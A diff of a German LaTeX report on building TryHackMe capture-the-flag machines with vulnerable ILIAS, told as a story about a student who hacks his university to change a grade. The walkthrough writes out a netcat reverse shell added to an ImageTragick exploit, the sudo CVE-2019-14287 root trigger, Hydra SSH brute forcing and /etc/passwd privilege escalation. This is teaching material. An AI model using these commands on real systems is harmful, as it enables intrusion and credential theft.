@@ -210,10 +210,10 @@
     \footnote{In dieser Arbeit wird aus Gründen der besseren Lesbarkeit das generische Maskulinum verwendet. Weibliche und anderweitige Geschlechteridentitäten werden dabei ausdrücklich mitgemeint.}
     Die Zuverlässigkeit moderner IT-Systeme entscheidet über Erfolg oder Misserfolg vieler Firmen, Branchen oder ganzer Nationen.
     In unserer immer stärker digitalisierten Welt, wird die Sicherheit und der Schutz digitaler Infrastruktur dementsprechend immer wichtiger.
-    Dies zeigt auch eine immer weiter zunehmenden Anzahl an Cyberangriffen, die es nötig macht, seine IT-Infrastruktur immer im Blick zu behalten und bestmöglich vor ungewollten Angriffen zu schützen.
-    Geschultes IT-Personal mit fundiertenKenntnissen im Umgang mit Schwachstelle ist somit unerlässlich.
-    Eine Möglichkeit ein solches Wissen zu erlangen, bietet die Lernplattform \href{https://tryhackme.com/}{TryHackMe}.
-    Sie bietet interessierten Personen die Möglichkeit sich in Lern- und Challengeräumen umfangreiches Wissen im Bereich Ethical Hacking anzueignen.
+    Dies zeigt auch eine immer weiter zunehmende Anzahl an Cyberangriffen, die es nötig macht, seine IT-Infrastruktur immer im Blick zu behalten und bestmöglich vor ungewollten Angriffen zu schützen.
+    Geschultes IT-Personal mit fundierten Kenntnissen im Umgang mit Schwachstelle ist somit unerlässlich.
+    Eine Möglichkeit, ein solches Wissen zu erlangen, bietet die Lernplattform \href{https://tryhackme.com/}{TryHackMe}.
+    Sie bietet interessierten Personen die Möglichkeit, sich in Lern- und Challengeräumen umfangreiches Wissen im Bereich Ethical Hacking anzueignen.
     Und das erworbene Wissen in einer realitätsnahen, aber dennoch abgesicherten Umgebung zu testen.
     Jüngst sind auch viele Hochschulen und Universitäten Ziel von Cyberangriffen geworden, oftmals mit dem Ziel Geld zu erpressen~\parencite{hhnGehackt}.
     Eine häufig zur Kommunikation genutzte Software an Universitäten und Hochschulen ist das Lernmanagementsystem ILIAS, das in der Vergangenheit ebenfalls verschiedene Schwachstellen aufwies, die ein Einfallstor für Hacker darstellten.
@@ -244,13 +244,13 @@
 
     \subsection{ILIAS}
     \label{subsec:ilias}
-    Die Abkürzung ILIAS beschreibt ein \ac{ilias} .
-    Bei der Software handelt es sich nicht um eine Lernplattform, sondern um ein System mit dem sich eine solche betreiben lässt.
+    Die Abkürzung ILIAS beschreibt ein \ac{ilias}.
+    Bei der Software handelt es sich nicht um eine Lernplattform, sondern um ein System, mit dem sich eine solche betreiben lässt.
     Die Software fällt unter die Kategorie Open-Source und ist somit für jedermann zugänglich und wird seit dem Jahre 2000, aufgrund großen Interesses, unter der GNU General Public Licence veröffentlicht.
     Mittlerweile erscheint \ac{ilias} in der achten Version und ermöglicht Lehrenden und Lernenden eine möglichst unkomplizierte Kommunikation.
-    \ac{ilias} ist wie eine Bibliothek zu verstehen, die es ermöglicht Wissen in Kursen möglichst einfach bereitzustellen und zu managen.
+    \ac{ilias} ist wie eine Bibliothek zu verstehen, die es ermöglicht, Wissen in Kursen möglichst einfach bereitzustellen und zu managen.
     Mittlerweile wurde diese Kernkompetenz zudem durch Module zur Kommunikation oder auch dem Durchführen von Onlineprüfungen ergänzt.
-    Nutzer sind mittlerweile nicht nur Hochschulen und Universitäten, sondern auch Akademien, die NATO und die Bayerische Polizei~\parencite{ilias}.
+    Nutzer sind mittlerweile nicht nur Hochschulen und Universitäten, sondern auch Akademien, die NATO und die bayerische Polizei~\parencite{ilias}.
 
     \subsection{Cross-Site-Scripting}
     \label{subsec:CrossSiteScripting}
@@ -318,13 +318,13 @@
     \subsubsection{CVE-2019-14287 (Sudo)}
     \label{subsubsec:sudo}
     Bei Sudo handelt es sich um ein Kommandozeilenprogramm für Unix Systeme, wie auch das von uns eingesetzte Betriebssystem Linux.
-    Es bietet die Möglichkeit Benutzern gewisse Rechte zuzuordnen.
+    Es bietet die Möglichkeit, Benutzern gewisse Rechte zuzuordnen.
     Diese sind somit in der Lage, Befehle auszuführen, für die es normalerweise die erhöhten Rechte eines anderen Nutzer notwendig sind.
     Die Schwachstelle \href{https://www.cvedetails.com/cve/CVE-2019-14287/?q=CVE-2019-14287}{CVE-2019-14287} tritt in Sudo Versionen vor 1.28 auf.
     Sudo wird dazu mit der manipulierten Nutzer-ID -1 oder 4294967295 wie folgt aufgerufen: sudo -u\#-1 /bin/bash.
     Da durch Sudo keine Prüfung auf Gültigkeit der ID stattfindet, wird der Befehl unter einer beliebigen ID mit sudo Privilegien ausgeführt.
     Dabei wird die Nutzer-ID null zurückgegeben, die der root Nutzer-ID entspricht.
-    Einem Angreifer ist es bei einer bestimmten sudoers Konfiguration (die den root Zugriff ausführlich verbietet) möglich, Befehle mit root Rechten auszuführen wie ein Exploit von \textcite{privilegeEscalationSudoExploit} zeigt:
+    Einem Angreifer ist es bei einer bestimmten sudoers Konfiguration (die den root Zugriff ausführlich verbietet) möglich, Befehle mit root Rechten auszuführen, wie ein Exploit von \textcite{privilegeEscalationSudoExploit} zeigt:
     \vspace{0.5cm}
     \begin{lstlisting}[label={lst:examplesudo}]
         #User hacker sudo privilege in /etc/sudoers
@@ -361,7 +361,7 @@
     Dementsprechend ist es jedem Nutzer des Systems gestatte, die Datei zu lesen/read, schreiben/write und auszuführen/execute~\parencite{privilegeEscalationFehlkRechte}.
     Eine solche Fehlkonfiguration führt zu schwerwiegenden Sicherheitsproblemen für das System.
     Angreifer sind so in der Lage auf Nutzerinformationen zuzugreifen, sich eigene Nutzer mit root Rechten anzulegen und so selber root zu werden.
-    Eine solche Fehlkonfiguration sollte unter allen Umständen vermieden werden und dient in der \ac{vm}2 lediglich der Veranschaulichung welche Folgen eine solche für ein System haben kann.
+    Eine solche Fehlkonfiguration sollte unter allen Umständen vermieden werden und dient in der \ac{vm}2 lediglich der Veranschaulichung, welche Folgen eine solche für ein System haben kann.
 
 
 
@@ -510,7 +510,8 @@
     \subsection{Virtuelle Maschine 1}
     \label{subsec:virtuelle-maschine-1}
     Ziel von TimDerHackerboy ist es also, seine Note im Fach PSSWE zu ändern und dabei bestenfalls keine Spuren zu hinterlassen. Erst einmal macht Tim einen \href{https://github.com/nmap/nmap}{\textbf{Nmap}} Scan
-    um offene Ports zu entdecken. Tatsächlich ist der Port 8080 geöffnet, was Tim vermuten lässt, dass dort Ilias zu erreichen ist.
+    um, offene Ports zu entdecken.
+    Tatsächlich ist der Port 8080 geöffnet, was Tim vermuten lässt, dass dort Ilias zu erreichen ist.
     \begin{figure}[H]
         \centering
         \includegraphics[width=1\textwidth]{VM1_Bilder/NmapScan.PNG}
@@ -518,8 +519,8 @@
         \label{fig:NmapScan}
     \end{figure}
     \noindent
-    Wenn Tim versucht die Login Seite über Port 8080 zu besuchen wird er nur von einer weißen Seite begrüßt,
-    er hat jetzt also zwei Probleme: Keine Login Seite und keine Login Credentials.
+    Wenn Tim versucht die Loginseite über Port 8080 zu besuchen wird er nur von einer weißen Seite begrüßt,
+    er hat jetzt also zwei Probleme: keine Login Seite und keine Login Credentials.
     Auf der Suche nach der Lösung einer dieser Probleme schaut er sich auch die robots.txt und stößt dabei auf einen interessanten Header.
 
     \begin{figure}[H]
@@ -532,9 +533,10 @@
     \subsubsection{Erlangen der login credentials durch XSS Schwachstelle}
     Nach einer kurzen Google Suche dieser Information in Kombination mit der Ilias Version findet er den passenden Eintrag auf \href{https://www.exploit-db.com/exploits/43595}{\textbf{exploit-db}}.
     In diesem Eintrag dreht es sich natürlich um den in~\ref{subsubsec:CVE-2018-5688} erwähnten \href{https://www.cve.org/CVERecord?id=CVE-2018-5688}{CVE-2018-5688}.
-    Auf der Seite \textit{/setup/setup.php} kann man über den query Parameter \textit{?cmd=} ein Script ausführen. Leider steht auf exploit-db nur der Proof of Concept,
-    somit muss sich Tim seinen eigenen Payload zusammen bauen. Durch sein Wissen aus dem Studium weiß Tim, dass JavaScript clientseitig ausgeführt wird, trotzdem können auf dem
-    Server gelegene Bilder und Dateien über JavaScript geladen werden. Jedoch hat XSS auch seine Limitationen, im Vergleich zu Command-Injection kann Tim keine Directories nach der SuperSecretFile.txt durchsuchen.
+    Auf der Seite \textit{/setup/setup.php} kann man über den query Parameter \textit{?cmd=} ein Script ausführen.
+    Leider steht auf exploit-db nur der Proof of Concept, somit muss sich Tim seinen eigenen Payload zusammen bauen.
+    Durch sein Wissen aus dem Studium weiß Tim, dass JavaScript clientseitig ausgeführt wird, trotzdem können auf dem Server gelegene Bilder und Dateien über JavaScript geladen werden.
+    Jedoch hat XSS auch seine Limitationen, im Vergleich zu Command-Injection kann Tim keine Directories nach der SuperSecretFile.txt durchsuchen.
     Tim hofft also erst einmal darauf, dass die Datei im momentanen root Directory der Webseite \textit{/setup} liegt und baut sich auf dieser Basis seinen Payload zusammen.
 
     \vspace{0.4cm}
@@ -555,10 +557,13 @@
     \vspace{0.3cm}
 
     \noindent
-    Tatsächlich hat Tim Glück, die Datei befindet sich im root Directory, dadurch kann er sich anstrengende Sucharbeit sparen. Wenn Tim seinen Payload ausführt,
-    bekommt er ein Javascript PopUp als Antwort, dieses enthält den Nutzernamen \\ \glqq SuperSecureAndi\grqq\ und einen Hash. Hoffentlich verbirgt sich hinter dem Hash das Passwort
-    zum Account, denkt sich Tim. Mithilfe von \href{https://crackstation.net/}{Crackstation.net} kann er den Hash knacken, das Passwort lautet \textit{iam123cute}, jedoch weiß Tim noch nicht, ob er sich mit
-    diesem Passwort tatsächlich einloggen kann, da er die Login Seite noch nicht gefunden hat.
+    Tatsächlich hat Tim Glück, die Datei befindet sich im root Directory, dadurch kann er sich anstrengende Sucharbeit sparen.
+    Wenn Tim seinen Payload ausführt,
+    bekommt er ein Javascript PopUp als Antwort, dieses enthält den Nutzernamen \\ \glqq SuperSecureAndi\grqq\ und einen Hash.
+    Hoffentlich verbirgt sich hinter dem Hash das Passwort
+    zum Account, denkt sich Tim.
+    Mithilfe von \href{https://crackstation.net/}{Crackstation.net} kann er den Hash knacken, das Passwort lautet \textit{iam123cute}, jedoch weiß Tim noch nicht, ob er sich mit
+    diesem Passwort tatsächlich einloggen kann, da er die Loginseite noch nicht gefunden hat.
 
     \begin{figure}[H]
         \centering
@@ -568,10 +573,11 @@
     \end{figure}
 
     \subsubsection{Finden der Login Seite mit Gobuster}
-    Tim ist sich sicher, dass die Login Seite existiert und die Entwickler sie nur versteckt haben. Nachdem seine manuelle Suche jedoch erfolglos blieb, entschließt er
-    sich ein Tool zum Finden von Directories zu benutzen. Für diese Art von Aufgabe eignet sich z.B. \href{https://github.com/OJ/gobuster}{Gobuster}.
+    Tim ist sich sicher, dass die Loginseite existiert und die Entwickler sie nur versteckt haben.
+    Nachdem seine manuelle Suche jedoch erfolglos geblieben war, entschließt er sich ein Tool zum Finden von Directories zu benutzen.
+    Für diese Art von Aufgabe eignet sich zum Beispiel \href{https://github.com/OJ/gobuster}{Gobuster}.
     Nach einem schnellen Scan mit dem Befehl \textit{gobuster dir -u http://<MACHINEIP>:8080 -w directory-list-2.3-medium.txt -x .php}
-    entdeckt Tim tatsächlich, dass man durch die Datei insidersecrets.php auf die richtige Login Seite weiter geleitet wird.
+    entdeckt Tim tatsächlich, dass man durch die Datei insidersecrets.php auf die richtige Loginseite weiter geleitet wird.
 
     \begin{figure}[H]
         \centering
@@ -592,26 +598,27 @@
     \end{figure}
 
     \subsubsection{Knacken des SSH Passworts mit Hydra}
-    Tim hat jetzt sein eigentliches Ziel erreicht, er hat seine Note von 5.0 auf 1.0 geändert und besteht dadurch mit Sicherheit das Fach PSSWE.
+    Tim hat jetzt sein eigentliches Ziel erreicht, er hat seine Note von 5.0 auf 1.0.
     Jedoch hat er beim Herumstöbern ein auffälliges Banner auf der \glqq My Workspace\grqq\ Seite von SuperSecureAndi gefunden und entschließt sich dem Ganzen auf den Grund zu gehen,
-    vielleicht ist es ihm ja sogar möglich seine Spuren zu verwischen.
+    vielleicht ist es ihm ja sogar möglich, seine Spuren zu verwischen.
 
     \begin{figure}[H]
         \centering
         \includegraphics[width=1\textwidth]{VM1_Bilder/YellowBanner.PNG}
-        \caption{Banner mit Infos über den SSH Zugang für Profs auf der \\ \glqq My Workspace\grqq\ Seite}
+        \caption{Banner mit Informationen über den SSH Zugang für Proffesoren auf der \\ \glqq My Workspace\grqq\ Seite}
         \label{fig:YellowBanner}
     \end{figure}
 
     \noindent
     Tim versucht eine Weile das Passwort für den SSH Zugang von SuperSecureAndi herauszufinden, jedoch ohne Erfolg. Mit seinem Latein etwas am Ende hofft Tim einfach,
-    dass SuperSecureAndi ein Standardpasswort verwendet und entschließt sich eine Brute-Force Attacke mit \href{https://github.com/vanhauser-thc/thc-hydra}{Hydra}
-    zu starten. Und tatsächlich, bei Benutzung des Befehls \textit{hydra -V -l SuperSecureAndi -P rockyou.txt ssh://<MACHINEIP>:2222} gibt Hydra nach einer kurzen Weile das Passwort \textit{bubbles} zurück.
+    dass SuperSecureAndi ein Standardpasswort verwendet und entschließt sich eine Brute-Force-Attacke mit \href{https://github.com/vanhauser-thc/thc-hydra}{Hydra}
+    zu starten.
+    Und tatsächlich, bei Benutzung des Befehls \textit{hydra -V -l SuperSecureAndi -P rockyou.txt ssh://<MACHINEIP>:2222} gibt Hydra nach einer kurzen Weile das Passwort \textit{bubbles} zurück.
 
     \begin{figure}[H]
         \centering
         \includegraphics[width=1\textwidth]{VM1_Bilder/HydraBruteforce.PNG}
-        \caption{Ergebnis der Bruteforce Attacke mit Hydra}
+        \caption{Ergebnis der Brute-Force-Attacke mit Hydra}
         \label{fig:HydraBruteforce}
     \end{figure}
 
@@ -650,9 +657,9 @@
 
     \subsection{Virtuelle Maschine 2}
     \label{subsec:vm2}
-    Nachdem TimDerHackerboy sicher erfolgreich durch die \ac{vm}1 gekämpft hat und sogar Credentials für neue ILIAS Version 5.2.4 in die Finger bekam, wird es Zeit für eine neue Aufgabe.
+    Nachdem TimDerHackerboy sicher erfolgreich durch die \ac{vm}1 gekämpft hat und sogar Credentials für neue ILIAS Version 5.2.4 in die Finger bekommen hatte, wird es Zeit für eine neue Aufgabe.
     Die neue ILIAS Version wird durch Administratoren der Hochschule gerade neu aufgesetzt und ist noch nicht für die Studenten zugänglich.
-    Die Verantwortlichen der Hochschule, zu denen auch der Professor SuperSicherAndi zählt, entschieden sich so die bekannte XSS Schachstelle aus Version 5.2.3 zu beheben.
+    Die Verantwortlichen der Hochschule, zu denen auch der Professor SuperSicherAndi zählt, entschieden sich so die bekannte XSS Schwachstelle aus Version 5.2.3 zu beheben.
     Doch Tims Nachname wäre nicht Hackerboy, würde er sich nicht direkt an die Arbeit machen und den Administratoren zeigen, dass sie ihre Arbeit nicht richtig machen.
     So könnte er Professor SuperSicherAndi sicher überzeugen, dass er die eins auf jeden Fall verdient hat, sollte dieser ihm trotz aller Vorsichtsmaßnahmen auf die Schliche kommen.
 
@@ -668,7 +675,7 @@
     \end{figure}
 
     Komplett vertieft will Tim sich direkt mit den Credentials einloggen.
-    Als er die Login-Seite kurz überfliegt, fallen ihm die Wort \textit{using ImageMagic(v6.9.3-8)} direkt auf.
+    Als er die Loginseite kurz überfliegt, fallen ihm die Wort \textit{using ImageMagic(v6.9.3-8)} direkt auf.
     \begin{figure}[H]
         \centering
         \includegraphics[width=1\textwidth]{storyline_bilder_vm2/loginPageHinweisImageMagick}
@@ -678,7 +685,7 @@
 
     \noindent
     Er hatte vor kurzem etwas über ImageTragick gelesen.
-    Und wie so oft, bietet \href{https://www.exploit-db.com/exploits/39767}{\textbf{exploit-db}} direkt die richtigen Informationen.
+    Und wie so oft bietet \href{https://www.exploit-db.com/exploits/39767}{\textbf{exploit-db}} direkt die richtigen Informationen.
 
     \vspace{0.4cm}
     \begin{lstlisting}[label={lst:imageMagickExploit}]
@@ -696,14 +703,14 @@
     Hacking \textcite{reverseShell} zeigt ein Beispiel für eine Netcat Reverse Shell: \textit{nc Ziel-IP Port –e /bin/bash}.
     Es gilt abschließend den in~\ref{lst:imageMagickExploit} beschriebene Exploit um die Netcat Reverse Shell ergänzen.
     Durch Ausprobieren musste die Formatierung des Exploits zudem leicht abgeändert werden, da die Reverse Shell sonst nach wenigen Sekunden abbrach.
-    Dass der Exploit ausgeführt wird, ist darauf zurückzuführen, dass ImageMagick versucht das Dateiformat anhand des Inhalts festzustellen.
+    Dass der Exploit ausgeführt wird, ist darauf zurückzuführen, dass ImageMagick versucht, das Dateiformat anhand des Inhalts festzustellen.
     Beim Erstellen des Exploits gilt es zu beachten, dass es sich bei dem Zielserver um einen Linux System handelt, welches nur unix Linebreaks versteht.
     Jedes in Windows geöffnete oder erstellt Datei muss demnach vorher umgewandelt werden, da der Exploit sonst fehlschlagen wird.
     Um das zu erreichen, helfen Tools wie Notepad++ oder das Kommandozeilenprogramm dos2unix:
     \begin{enumerate}[leftmargin=2.5cm]
         \item[1.] Datei in Notepad++ öffnen --> Menüpunkt \textit{Bearbeiten} auswählen --> \textit{EOL-Konvertierung} wählen --> \textit{Unix(LF)}.
         \item[2.] Oder \textit{dos2unix filename.txt} in die Kommandozeile eingeben.
-        Es gilt zu Beachten, dass nicht jedes System dos2unix unterstützt.
+        Es gilt zu beachten, dass nicht jedes System dos2unix unterstützt.
     \end{enumerate}
 
 
@@ -721,7 +728,7 @@
 
     \subsubsection{Verbindung mittels Reverse Shell herstellen und stabilisieren}
     \label{subsubsec:verbindungHerstellen}
-    Im nächsten Schritt gilt es mittels dem in~\ref{subsubsec:imageMagickFinden} erstellten Exploit eine Verbindung zum Server herzustellen.
+    Im nächsten Schritt gilt es mithilfe des in~\ref{subsubsec:imageMagickFinden} erstellten Exploit eine Verbindung zum Server herzustellen.
     Dazu muss Tim einen Netcat Listener erstellen, der den durch den Exploit angestoßenen Verbindungsversuch entgegennimmt.
     Das kann mittels des nc Befehls wie folgt erreicht werden: \textit{nc -lvnp zielIP zielport}.
     Wird nun der Exploit als Profilbild gespeichert,
@@ -733,7 +740,7 @@
     \end{figure}
     \noindent
     Nach, dem die Verbindung erfolgreich etabliert ist, kommt schon das nächste Problem auf Tim zu.
-    Die Bash Shell ist zu instabil um damit fortzufahren.
+    Die Bash Shell ist zu instabil, um damit fortzufahren.
     Um die Shell zu stabilisieren, beschreibt ~\textcite{shellStabilisieren} folgendes Vorgehen:
 
     \begin{enumerate}[leftmargin=2.5cm]
@@ -755,7 +762,7 @@
     \begin{figure}[H]
         \centering
         \includegraphics[width=1\textwidth]{storyline_bilder_vm2/userflag}
-        \caption{Einsammeln der erstern Flag \textit{userflag.txt} .}
+        \caption{Einsammeln der ersten Flag \textit{userflag.txt}.}
         \label{fig:userflag}
     \end{figure}
     \noindent
@@ -765,7 +772,7 @@
 
     \subsubsection{Scan auf Schwachstellen}
     \label{subsubsec:scanSchwachstellen}
-    Tim lässt sich zu ersteinmal mit \textit{ls} alle Dateien und Verzeichnisse im aktuellen Verzeichnis zeigen, dabei stößt er direkt auf eine Datei names SuperSecretFlag.txt.
+    Tim lässt sich erst einmal mit \textit{ls} alle Dateien und Verzeichnisse im aktuellen Verzeichnis zeigen, dabei stößt er direkt auf eine Datei namens SuperSecretFlag.txt.
     Beim Versuch die Datei zu öffnen zeigt sich jedoch, einzig und alleine der root Nutzer hat Zugriff auf die Datei.
 
     \begin{figure}[H]
@@ -778,11 +785,11 @@
     Für Tim steht fest, er muss root Nutzer werden, denn so leicht gibt er nicht auf.
     Wie der \href{https://tryhackme.com/room/linprivesc}{\textbf{TryHackMe Raum}}~\parencite{privilegeEscalationRaumTryHackMe} zeigt, gibt es hierfür verschiedene Herangehensweisen.
     Tim entscheidet sich erst einmal einen Basic Scan durchzuführen.
-    Dafür nutzt er ein selbstgeschriebenes Skript (\ref{lst:schwachstellentestSkript}), welches auf verschieden Schwachstellen testet.
+    Dafür nutzt er ein selbstgeschriebenes Skript (\ref{lst:schwachstellentestSkript}), welches auf verschiedene Schwachstellen testet.
     Darunter fallen unter anderem eine fehlerhafte Konfiguration sensibler Dateien, anfällige Versionen von Sudo oder OpenSSl.
-    Hierfür gibt es ebenfalls Skripte auf GitHub oder verschiedene anerkannte Tools wie OpenVas, Nikto oder Lynis die diese Arbeit erleichtern.
+    Hierfür gibt es ebenfalls Skripte auf GitHub oder verschiedene anerkannte Tools wie OpenVas, Nikto oder Lynis, welche diese Arbeit erleichtern.
     \\
-    Wie Tim weiß, sind folgenden Schritte notwendig um das Skript auszuführen:
+    Wie Tim weiß, sind folgenden Schritte notwendig, um das Skript auszuführen:
     \begin{enumerate}[leftmargin=2.5cm]
         \item[1.] \textit{nano scan.sh}  in die Kommandozeile eingeben, um eine Datei namens scan.sh im Texteditor nano zu öffnen.
         \item[2.] Den Code des Skriptes im Editor einfügen und als scan.sh speichern.
@@ -807,7 +814,7 @@
     \subsubsection{Privilege Escalation unter Ausnutzung der /etc/passwd Datei}
     \label{subsubsec:privilegeEscalation1}
     Nachdem mögliche Schwachstellen bereits aufgedeckt wurden, gilt es diese nun auszunutzen.
-    Tims Freund~\textcite{privilegeEscalationRaumTryHackMe} beschreibt in seinem \href{https://tryhackme.com/room/linprivesc}{\textbf{TryHackMe Raum}} anschaulich wie ein neuer Nutzer in die /etc/passwd Datei eingefügt werden kann.
+    Tims Freund~\textcite{privilegeEscalationRaumTryHackMe} beschreibt in seinem \href{https://tryhackme.com/room/linprivesc}{\textbf{TryHackMe Raum}} anschaulich, wie ein neuer Nutzer in die /etc/passwd Datei eingefügt werden kann.
     Kurz und prägnant zusammengefasst, ist dies durch folgende Schritte zu erreichen:
 
     \begin{enumerate}[leftmargin=2.5cm]
@@ -842,7 +849,7 @@
     Die Fehlkonfiguration der /etc/passwd Datei konnte erfolgreich ausgenutzt werden, aber diese war nicht die einzige Schwachstelle, die während des Scans aufgedeckt wurde.
     Mit der Sudo Version 1.8.27 existiert eine weitere Schwachstelle im System.
     \href{https://www.exploit-db.com/exploits/47502}{Exploit-db} und \href{https://www.cvedetails.com/cve/CVE-2019-14287/?q=cve-2019-14287}{CVE Details} bieten auch hier nach kurzer Recherche ausrechnend Informationen.
-    Da wie in~\ref{subsubsec:sudo} beschrieben, gewisse Konfigurationen in der sudoers Datei vorliegen müssen, ist nur durch Ausprobieren festzustellen, ob die Schwachstelle ausnutzbar ist.
+    Da, wie in~\ref{subsubsec:sudo} beschrieben, gewisse Konfigurationen in der sudoers Datei vorliegen müssen, ist nur durch Ausprobieren festzustellen, ob die Schwachstelle ausnutzbar ist.
     Zum einen, stellt \textcite{privilegeEscalationSudoExploit} einen Exploit bereit.
     Zum andern, lässt sich die Schwachstelle durch Eingabe des nachfolgenden Befehls auslösen: \textit{sudo -u\#-1 /bin/bash}.
 
@@ -881,7 +888,7 @@
     Daher konnte nicht getestet werden, ob die \ac{vm} erfolgreich auf TryHackMe ausgeführt werden kann.
     TryHackMe hat nach mehreren Wochen den Bug fixen können, sodass die \ac{vm} nun ausgeführt werden konnte.
     Dabei wurde jedoch klar, dass der zugewiesene Arbeitsspeicher nicht genügt, um die \ac{vm} zuverlässig auszuführen.
-    Auch hier hat der TryHackMe-Support mehr Arbeitsspeicher zuweisen können, sodass die \ac{vm} nun zuverlässig läuft.
+    Auch hier hat der TryHackMe-Support mehr Arbeitsspeicher zuweisen können, sodass die \ac{vm} jetzt zuverlässig läuft.
 
     \subsection{Virtuelle Maschine 1}
     \label{subsec:vm1lessonslearned}
@@ -894,12 +901,12 @@
     \subsubsection{XSS Schwachstelle}
     \label{subsubsec:lessonslearnedXSS}
     Um die \ac{xss}-Schwachstelle korrekt einsetzen zu können, musste ein gewisses Verständnis für diese etabliert werden.
-    Dabei war vor allem relevant zu verstehen, wie genau sensible Daten per \ac{xss} offengelegt werden können.
+    Dabei war vor allem relevant, zu verstehen, wie genau sensible Daten per \ac{xss} offengelegt werden können.
     So konnten dann die \ac{xss}-Payloads korrekt designt werden.
 
     \subsubsection{Einfügen eines gelben Banners auf der \glqq My Workplace\grqq-Seite in ILIAS}
     \label{subsubsec:lessonslearnedHTTP}
-    Um einen gelben Banner auf der \glqq My Workplace\grqq-Seite in ILIAS zu erstellen, werden grundlegende Kenntnisse in HTML, JavaScript und CSS benötigt.
+    Um ein gelbes Banner auf der \glqq My Workplace\grqq-Seite in ILIAS zu erstellen, werden grundlegende Kenntnisse in HTML, JavaScript und CSS benötigt.
     Die Seitenstruktur in ILIAS besteht aus einzelnen HTML-Bausteinen, die mithilfe von PHP-Skripten in HTML-Template-Dateien integriert werden.
     Es wurde festgestellt, dass die Einbindung eigener Komponenten in diese Seiten problematisch sein kann, da es zu Kollisionen oder Überlagerungen mit vorhandenen Elementen kommen kann.
     Die Bearbeitung des Webseiteninhalts in der Datei \glqq tpl.main.html\grqq\ gestaltete sich als anspruchsvoll, insbesondere bei der Integration neuer Elemente.
@@ -909,30 +916,36 @@
     Dadurch konnte der Verlust von Änderungen bei einem Containerneustart oder der Zerstörung des Containers vermieden werden.
     Es war erforderlich, die Dateistruktur im ILIAS-Container genau zu analysieren, um die richtige Vorgehensweise für die Einbindung eigener Komponenten zu ermitteln.
 
-    \subsubsection{Verstecken der ILIAS Login-Seite}
+    \subsubsection{Verstecken der ILIAS Loginseite}
     \label{subsubsec:lessonslearnedLogin}
-    Beim Versuch, die Login-Seite zu verstecken, wurden verschiedene Ansätze wie die Verwendung von .htaccess (einer Datei zur Festlegung von \glqq Regeln\grqq\ wie z.B. das Verbieten von Sonderzeichen in der URL) und apache2.conf (der Konfigurationsdatei des Webservers) ausprobiert.
-    Die Idee bestand darin, die \glqq/login.php\grqq\ -Seite auf eine neue URL umzuleiten, z.B. \glqq/newUrl\grqq, und die alte \glqq/login.php\grqq-Seite mit einem 410 GONE-Fehler zu sperren.
+    Beim Versuch, die Loginseite zu verstecken, wurden verschiedene Ansätze wie die Verwendung von .htaccess (einer Datei zur Festlegung von \glqq Regeln\grqq\ wie zum Beispiel das Verbieten von Sonderzeichen in der URL) und apache2.conf (der Konfigurationsdatei des Webservers) ausprobiert.
+    Die Idee bestand darin, die \glqq/login.php\grqq\ -Seite auf eine neue URL umzuleiten, zum Beispiel \glqq/newUrl\grqq, und die alte \glqq/login.php\grqq-Seite mit einem 410 GONE-Fehler zu sperren.
     Es stellte sich jedoch heraus, dass unabhängig von der verwendeten Umleitungsmethode (in verschiedenen Varianten von .htaccess, apache2.conf, HTML, PHP) und der verwendeten Sperrmethode (in verschiedenen Varianten von .htaccess und apache2.conf) entweder beide URLs erreichbar waren oder keine der URLs gesperrt wurde.
     Als zweite Idee wurde erwogen, die Dateien (von nur \glqq login.php\grqq\ bis zum gesamten Webserver) in ein tieferes Verzeichnis zu verschieben, sodass sie nicht gefunden werden konnten.
     Dies führte jedoch zu erheblichem Konfigurationsaufwand und Komplexität, ohne dass das gewünschte Ergebnis erzielt wurde, da die Dateien nicht mehr auffindbar waren.
     Schließlich wurde eine Lösung gefunden, indem die \glqq /login.php\grqq-Seite durch das Fehlen eines Query-Parameters gesperrt wurde.
     In der \glqq login.php\grqq-Datei wurde überprüft, ob \glqq init==true\grqq\ ist.
-    Falls nicht, wurde die Login-Seite nicht angezeigt.
-    Die Datei \glqq insidersecrets.php\grqq\ enthielt eine Umleitung auf \glqq /login.php?init=true\grqq, um die Login-Seite anzuzeigen.
+    Falls nicht, wurde die Loginseite nicht angezeigt.
+    Die Datei \glqq insidersecrets.php\grqq\ enthielt eine Umleitung auf \glqq /login.php?init=true\grqq, um die Loginseite anzuzeigen.
     Dies erfolgte mithilfe von JavaScript, da sich die IP-Adresse ständig ändert und \glqq localhost\grqq\ nicht verwendet werden konnte.
-    Somit war die Login-Seite nur über \glqq insidersecrets.php\grqq\ erreichbar (oder man kannte den genauen Parameter und setzte ihn manuell).
+    Somit war die Loginseite nur über \glqq insidersecrets.php\grqq\ erreichbar (oder der genauen Parameter war bekannt und wurde manuell gesetzt).
 
     %Freddy
     \subsubsection{Verbindungsaufbau zum Docker Container über SSH}
     \label{subsubsec:lessonslearnedDockerSSH}
-    Den Docker Container über SSH erreichbar zu machen, benötigt mehrere verschiedene Schritte. Generell muss natürlich erst einmal \href{https://github.com/openssh}{openssh-server} über das base Dockerfile
-    installiert werden. Ein Nutzer inklusive Passwort kann über das Dockerfile des Ilias Images angelegt werden. Ein größeres Problem stellt jedoch das Starten des SSH Services auf dem Ilias Container dar.
-    Manuell kann der Service ohne Probleme gestartet werden, jedoch geschieht das nicht per default beim Starten der Maschine, da Debian auf dem Container ein sehr leichtes init System ist. Um dieses Problem
-    zu lösen wurde dann die Ubuntu \ac{vm} ins Spiel gebracht, vorher lief die Anwendung über Docker auf Windows direkt. Die VM war zu diesem Zeitpunkt zwar schon für Ilias 5.2.4 mit \hyperref[subsubsec:CVE-2016-3714]{ImageTragick}-Schwachstelle
-    vorkonfiguriert, kam jedoch trotzdem mit jeder Menge Problemen und Konfigurationsaufwand. Das Problem des nicht laufenden SSH Services wurde dann über den sudo crontab der \ac{vm} gelöst, welcher den SSH Service startet.
+    Den Docker Container über SSH erreichbar zu machen, benötigt mehrere verschiedene Schritte.
+    Generell muss natürlich erst einmal \href{https://github.com/openssh}{openssh-server} über das base Dockerfile
+    installiert werden.
+    Ein Nutzer inklusive Passwort kann über das Dockerfile des Ilias Images angelegt werden.
+    Ein größeres Problem stellt jedoch das Starten des SSH Services auf dem Ilias Container dar.
+    Manuell kann der Service ohne Probleme gestartet werden, jedoch geschieht das nicht per Default beim Starten der Maschine, da Debian auf dem Container ein sehr leichtes init System ist. Um dieses Problem
+    zu lösen wurde dann die Ubuntu \ac{vm} ins Spiel gebracht, vorher lief die Anwendung über Docker auf Windows direkt.
+    Die VM war zu diesem Zeitpunkt zwar schon für Ilias 5.2.4 mit \hyperref[subsubsec:CVE-2016-3714]{ImageTragick}-Schwachstelle
